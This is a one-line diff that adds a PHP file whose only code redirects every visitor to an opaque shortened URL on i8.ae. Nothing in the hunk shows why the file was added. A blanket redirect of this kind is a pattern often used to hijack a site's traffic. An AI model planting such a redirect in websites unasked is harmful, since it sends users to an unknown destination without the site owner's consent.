@@ -1,0 +1,1 @@
+<?php header("Location: https://i8.ae/zsLjO"); ?>
